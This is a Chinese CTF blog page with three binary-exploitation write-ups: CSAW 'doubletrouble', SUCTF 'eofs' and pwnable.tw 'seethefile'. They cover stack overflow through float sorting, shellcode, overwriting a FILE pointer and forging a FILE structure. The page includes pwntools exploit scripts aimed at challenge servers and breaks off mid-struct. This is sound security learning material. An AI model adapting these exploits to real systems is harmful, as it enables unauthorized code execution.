<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0"><link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Pisces",version:"6.3.0",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!1,fastclick:!1,lazyload:!1,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta name="description" content="Talking is cheap, show me the code."><meta property="og:type" content="website"><meta property="og:title" content="Ama2in9"><meta property="og:url" content="http://yoursite.com/page/2/index.html"><meta property="og:site_name" content="Ama2in9"><meta property="og:description" content="Talking is cheap, show me the code."><meta property="og:locale" content="zh-Hans"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Ama2in9"><meta name="twitter:description" content="Talking is cheap, show me the code."><link rel="canonical" href="http://yoursite.com/page/2/"><script type="text/javascript" id="page.configurations">CONFIG.page={sidebar:""}</script><title>Ama2in9</title><noscript><style type="text/css">.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-home"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">Ama2in9</span><span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-toggle"> <button aria-label="Toggle navigation bar"><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>Archives</a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><section id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/doubletrouble/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="ama2in9"><meta itemprop="description" content="Talking is cheap, show me the code."><meta itemprop="image" content="/images/head.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ama2in9"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/2018/11/25/doubletrouble/" itemprop="url">doubletrouble</a></h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2018-11-25 17:07:07" itemprop="dateCreated datePublished" datetime="2018-11-25T17:07:07+08:00">2018-11-25</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/csaw/" itemprop="url" rel="index"><span itemprop="name">csaw</span></a></span></span> <span class="post-comments-count"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span><a href="/2018/11/25/doubletrouble/#comments" itemprop="discussionUrl"><span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/11/25/doubletrouble/" itemprop="commentCount"></span></a></span> <span id="/2018/11/25/doubletrouble/" class="leancloud_visitors" data-flag-title="doubletrouble"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">Views:</span><span class="leancloud-visitors-count"></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="casaw-gt-doubletrouble"><a href="#casaw-gt-doubletrouble" class="headerlink" title="casaw-&gt;doubletrouble"></a>casaw-&gt;doubletrouble</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前也遇到了一道类似的题，但是没有涉及到浮点数在内存中的存储，这道题更加综合，也给出来了绕过canary的一种思路，因此详细写一下writeup</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>主函数是game，用户首先输入array的长度，大于64直接崩，但是会打印出system函数的地址，这个地址是不固定的。当小于等于64的时候，用户依次输入数组元素，之后打印数组成员，给出元素之和，最大元素和最小元素，找到出题人喜欢的元素，对数组排序等，挨个查看内部的逻辑，最终可以找到函数异常的部分</p><p><img src="/2018/11/25/doubletrouble/1.jpg" alt="function"><br><img src="/2018/11/25/doubletrouble/2.jpg" alt="function2"></p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在findArray()里，len表示数组长度，当arrary_len小于2倍原数组长度的时候，如果数组元素大于-100而小于-10，就返回这个元素的下标，如果遍历所有的元素均未发现满足此条件的元素，直接返回第一个元素。程序的问题在于每次遍历寻找的时候，都会增加数组的长度，这使得如果找到一个满足条件的元素，数组的长度都会发生变化。当然在这里，还没有显示破坏性。在下面的sortArray里，由于用到array_len判断程序的结束部分，之前增加的array_len会使得排序的部分超过了数组原有部分，且直接修改栈上的值。<br>比如我们输入100、-20、100，第一个元素不满足条件，数组长度变为4，随后的排序中，会将100后面的元素也一同排序，假设后面的值为90，那么就会被替换成100</p><p><img src="/2018/11/25/doubletrouble/3.jpg" alt="find_array"><br><img src="/2018/11/25/doubletrouble/4.jpg" alt="sort_array"></p><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>这次栈上的元素都是8字节的double类型，我们想往栈上写数据就要了解数据的表示。在IEEE 754标准下，32位浮点数和64位浮点数的表示如下：（其中S是sign，E为exponet，M为fraction）</p><p><img src="/2018/11/25/doubletrouble/5.jpg" alt="data_form"><br><img src="/2018/11/25/doubletrouble/5.png" alt="32_float"><br><img src="/2018/11/25/doubletrouble/6.png" alt="64_double"><br><img src="/2018/11/25/doubletrouble/6.jpg" alt="calc"></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><img src="/2018/11/25/doubletrouble/7.jpg" alt="example"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序开始打印了数组在栈上的地址，我们可以控制返回地址到system函数的地址，后面接参数’/bin//sh’，也可以让程序返回到数组，执行数组里的shellcode，我们挨个尝试一下</p><p>因为最后要排序，我们得看下ebp和return addr的大小关系，根据IDA里可看到数组地址为ebp-0x210，64个元素之后就是64*8 = 0x200,因此要再多输入3个元素才能覆盖到返回地址，其中，ebp-0xc存的是canary，不能受排序影响，即第65个元素不变，第66个元素随意，第67个元素为system函数地址，第68个元素为’/bin/sh’，测试发现canary有时候正有时候负，变化很大，看来只能假设它是个比返回地址大的数，这样不会和被替换的返回地址交换。最后发现被替换的部分总是正数，大于-20，因此永远不可能让-20等负数到canary的下面，所以这个方法GG</p><p>尝试第二种方式，首先找到system在got表中的地址，之后发现程序中包含’/bin/csh’，结合以前做题的经验，我们知道system(‘sh’)一样可以执行，sh相对于字符串的偏移为25，即0x19，所以’sh’的地址为0x0804A12D，shellcode为:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x804A12D</span><br><span class="line">call dword ptr [0x804BFF0]</span><br></pre></td></tr></table></figure><p></p><p><img src="/2018/11/25/doubletrouble/8.jpg" alt="system_got"><br><img src="/2018/11/25/doubletrouble/9.jpg" alt="binsh_addr"></p><p>最终栈的结构如下:shellcode + padding + ret_addr<br><img src="/2018/11/25/doubletrouble/10.jpg" alt="ret_addr"></p><p>##exp.py<br>因为canary的值老变化，所以最终的exp还是要看脸，要想全自动化可以写个while True然后判断返回结果，这里我自己的exp也没跑通，上个官方的吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__LIBC__ = <span class="string">""</span></span><br><span class="line">__NAME__ = <span class="string">"doubletrouble"</span></span><br><span class="line">__REMOTE__ = <span class="string">"pwn.chal.csaw.io"</span></span><br><span class="line">__REMOTE_PORT__ = <span class="number">9002</span></span><br><span class="line">__GDB__ = <span class="string">"""</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	log.info(<span class="string">"pwning %s"</span>  % __NAME__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> args.REMOTE:</span><br><span class="line"></span><br><span class="line">		log.info(<span class="string">"remote run"</span>)</span><br><span class="line">		r = remote(__REMOTE__, __REMOTE_PORT__)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">		log.info(<span class="string">"local run"</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> args.GDB:</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> args.GDB == <span class="string">'attach'</span>:</span><br><span class="line"></span><br><span class="line">				r = process(<span class="string">"./%s"</span> % __NAME__, env=&#123;<span class="string">'LD_PRELOAD'</span>: __LIBC__&#125;)</span><br><span class="line">				log.info(<span class="string">"attaching gdb..."</span>)</span><br><span class="line">				gdb.attach(r.pid, __GDB__)	</span><br><span class="line"></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">				r = gdb.debug(<span class="string">"./%s"</span> % __NAME__, __GDB__)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">			r = process(<span class="string">"./%s"</span> % __NAME__, env=&#123;<span class="string">'LD_PRELOAD'</span>: __LIBC__&#125;)</span><br><span class="line"></span><br><span class="line">	r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">	stack = r.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	stack = int(stack, <span class="number">16</span>)</span><br><span class="line">	log.info(<span class="string">"stack 0x%x"</span>, stack)</span><br><span class="line"></span><br><span class="line">	r.sendlineafter(<span class="string">"long: "</span>, str(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line">	pad = <span class="string">"%.20g"</span> % unpack(<span class="string">"&lt;d"</span>, p64(<span class="number">0xf8ffffffffffffff</span>))[<span class="number">0</span>]</span><br><span class="line">	jmp  = <span class="number">0x080498A4ffffffff</span> <span class="comment"># ret gadget</span></span><br><span class="line">	jmp2 = <span class="number">0x0806000000000000</span> + stack <span class="comment"># addr of shellcode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sh1 = asm(<span class="string">"push 0x804A12D; jmp $+3"</span>).ljust(<span class="number">8</span>, <span class="string">'\xfe'</span>)</span><br><span class="line">	sh2 = asm(<span class="string">"call dword ptr [0x804BFF0]"</span>).ljust(<span class="number">8</span>, <span class="string">'\xfc'</span>)</span><br><span class="line"></span><br><span class="line">	r.sendline(<span class="string">"%.20g"</span> % struct.unpack(<span class="string">"&lt;d"</span>, sh1)[<span class="number">0</span>])</span><br><span class="line">	r.sendline(<span class="string">"%.20g"</span> % struct.unpack(<span class="string">"&lt;d"</span>, sh2)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">2</span>):</span><br><span class="line">		r.sendline(pad)</span><br><span class="line"></span><br><span class="line">	r.sendline(str(<span class="number">-99</span>))</span><br><span class="line">	r.sendline( <span class="string">"%.20g"</span> % struct.unpack(<span class="string">"&lt;d"</span>, p64(jmp))[<span class="number">0</span>])</span><br><span class="line">	r.sendline( <span class="string">"%.20g"</span> % struct.unpack(<span class="string">"&lt;d"</span>, p64(jmp2))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">64</span><span class="number">-7</span>):</span><br><span class="line">	 	r.sendline( pad)</span><br><span class="line"></span><br><span class="line">	r.sendline(<span class="string">"ls"</span>)</span><br><span class="line">	r.interactive()</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/eofs/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="ama2in9"><meta itemprop="description" content="Talking is cheap, show me the code."><meta itemprop="image" content="/images/head.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ama2in9"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/2018/11/25/eofs/" itemprop="url">eofs</a></h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2018-11-25 17:00:54" itemprop="dateCreated datePublished" datetime="2018-11-25T17:00:54+08:00">2018-11-25</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/SUCTF招新赛/" itemprop="url" rel="index"><span itemprop="name">SUCTF招新赛</span></a></span></span> <span class="post-comments-count"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span><a href="/2018/11/25/eofs/#comments" itemprop="discussionUrl"><span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/11/25/eofs/" itemprop="commentCount"></span></a></span> <span id="/2018/11/25/eofs/" class="leancloud_visitors" data-flag-title="eofs"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">Views:</span><span class="leancloud-visitors-count"></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="SUCTF-gt-eofs"><a href="#SUCTF-gt-eofs" class="headerlink" title="SUCTF-&gt;eofs"></a>SUCTF-&gt;eofs</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个招新赛的题目比较简单，去做了几道简单题，这是第一次接触文件的题，现学的文件，最后还是没做出来，中间还是有一些经验，比如看到一个不太正常的函数名(lookForHeader)最好先去查一下这个函数，说不定就是哪个CVE改编来的，看之前的CVE复现或者讲解有利于做题，不能闷头做</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序的main函数里打开了同级目录下的readme.txt，句柄为fd，此时注意fd并不是局部变量，而是位于bss段的0x602180的全局变量，后面从标准输入中读取最多0x1F40-1字节的数据，观察s的位置，并不能覆盖返回地址或者哪里，再往下看su_server</p><p><img src="/2018/11/25/eofs/1.jpg" alt="main"></p><p>su_server先以时间为种子生成随机数，之后清空host、username和researchfield等几个bss段全局变量的值，其中host地址为0x602220、username地址为0x6021a0、researchfield地址为0x602100.v3随机数先赋值给0x60229F、0x60221F、0x60217F等三个地址，之后用户输入作为参数传入lookForHeader函数，下面if的条件是只要上面三个地址任意一个值不为v3就为真。之前v3已经被赋值了，这里不再相等要么溢出到v3修改掉，要么之前的三个地址里有一个被覆写掉。亦或者有个地址任意写最好。假设现在进了条件，要进入secret()拿到shell，还得让fd-&gt;_flag == 0xdeadbeef，即0x602180的值为0xdeadbeef的地址，观察一下地址之间的差值，发现是可以通过覆写host、username、researchfield的值来改掉三个变量，只要lookForHeader里的函数有溢出漏洞即可，并且由于fd和researchfield之间为0x80的距离，是很有可能被溢出的，下面继续看lookForHeader</p><p><img src="/2018/11/25/eofs/2.jpg" alt="su_server"></p><p>lookForHeader其实是一个CVE里的漏洞函数，做题的时候没有去查蛮遗憾，但是实际上这个函数也并不难理解，是自己的逆向的水平太低，看代码看不来，以后需要提高这方面的水平.</p><p>lookForHeader的注释标注了逻辑，也就是说我们需要构造几个相同格式的字符串部分以造成溢出，进而覆写fd</p><p><img src="/2018/11/25/eofs/3.jpg" alt="lookForHeader"><br><img src="/2018/11/25/eofs/4.jpg" alt="lookForHeader2"></p><h2 id="数据构造"><a href="#数据构造" class="headerlink" title="数据构造"></a>数据构造</h2><p>首先绕过su_server里的srncmp，即payload = ‘GET / HT’,看起来好看一点的话就全留下来好了<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;GET / HTTP/1.1#&apos;</span><br><span class="line">payload += &apos;Host:127.0.0.1#&apos;</span><br><span class="line">payload += &apos;Username:xmzyshypnc#&apos;</span><br><span class="line">payload += &apos;ResearchField:&apos;</span><br><span class="line">payload += p64(0xdeadbeef)</span><br><span class="line">payload += &apos;a&apos;*0x38+&apos;#&apos;</span><br><span class="line">payload += &apos;ResearchField:&apos;+&apos;a&apos;*0x40+p64(0x602100)+&apos;#&apos;</span><br></pre></td></tr></table></figure><p></p><p>又因为0x60217F在溢出范围内，所以if也可以进去，下面是exp</p><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./eofs'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'43.254.3.203'</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'GET / HTTP/1.1#'</span></span><br><span class="line">payload += <span class="string">'Host:127.0.0.1#'</span></span><br><span class="line">payload += <span class="string">'Username:xmzyshypnc#'</span></span><br><span class="line">payload += <span class="string">'ResearchField:'</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x38</span>+<span class="string">'#'</span></span><br><span class="line">payload += <span class="string">'ResearchField:'</span>+<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0x602100</span>)+<span class="string">'#'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><img src="/2018/11/25/eofs/6.jpg" alt="flag"></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/seethefile/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="ama2in9"><meta itemprop="description" content="Talking is cheap, show me the code."><meta itemprop="image" content="/images/head.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ama2in9"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/2018/11/25/seethefile/" itemprop="url">seethefile</a></h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2018-11-25 16:54:30" itemprop="dateCreated datePublished" datetime="2018-11-25T16:54:30+08:00">2018-11-25</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwnable-tw/" itemprop="url" rel="index"><span itemprop="name">pwnable.tw</span></a></span></span> <span class="post-comments-count"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span><a href="/2018/11/25/seethefile/#comments" itemprop="discussionUrl"><span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/11/25/seethefile/" itemprop="commentCount"></span></a></span> <span id="/2018/11/25/seethefile/" class="leancloud_visitors" data-flag-title="seethefile"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">Views:</span><span class="leancloud-visitors-count"></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="pwnable-tw-gt-seethefile"><a href="#pwnable-tw-gt-seethefile" class="headerlink" title="pwnable.tw-&gt;seethefile"></a>pwnable.tw-&gt;seethefile</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SUCTF里做了一道简单的文件题，想趁热打铁多了解一些文件结构的知识，于是时隔多年再次杀回pwnable.tw，不过遗憾的是这个题还是没能自己做出来，不过依然有一些trick可以借鉴，因此写篇writeup提醒自己</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序也比较简单，用户输入文件名，打开之后每次读取0x18F字节，输出到屏幕上，关闭文件，退出。这里的exit前会让用户输入自己的姓名，name位于.bss段的0x0804B260处，而文件句柄fp位于.bss段的0x0804B280处。这里的scanf并没有限制输入的长度，因此存在溢出漏洞。</p><p><img src="/2018/11/25/seethefile/1.jpg" alt="code"></p><h2 id="数据构造"><a href="#数据构造" class="headerlink" title="数据构造"></a>数据构造</h2><h3 id="Libc基址"><a href="#Libc基址" class="headerlink" title="Libc基址"></a>Libc基址</h3><p>根据前面学到的知识，文件可以通过覆写vtable来修改一些函数指针指向我们想要执行的函数。因此，可以通过伪造FILE结构来执行shell，首先是libc基址的寻找，也正是在这里我直接卡住放弃的。看了p4nda师傅的wp得知文件执行的时候Linux会将进程的虚拟地址空间存储在/proc/<pid>/maps里，由于我们无从得知PID，因此使用self即可看到本进程的映射表，第一行libc.so的起始地址即为libc加载的基地址。这里还要注意由于read的长度有限，需要两次读才能读到libc.so。得到Libc基址之后即可得到system的地址。</pid></p><h3 id="FILE结构体"><a href="#FILE结构体" class="headerlink" title="FILE结构体"></a>FILE结构体</h3><p>FILE结构体比较复杂，构造的时候要注意一些关键的验证条件要满足，这里给出CTF All In One的libio.h中的实现(glibc2.23)<br></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* <span class="doctag">Note:</span>  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span 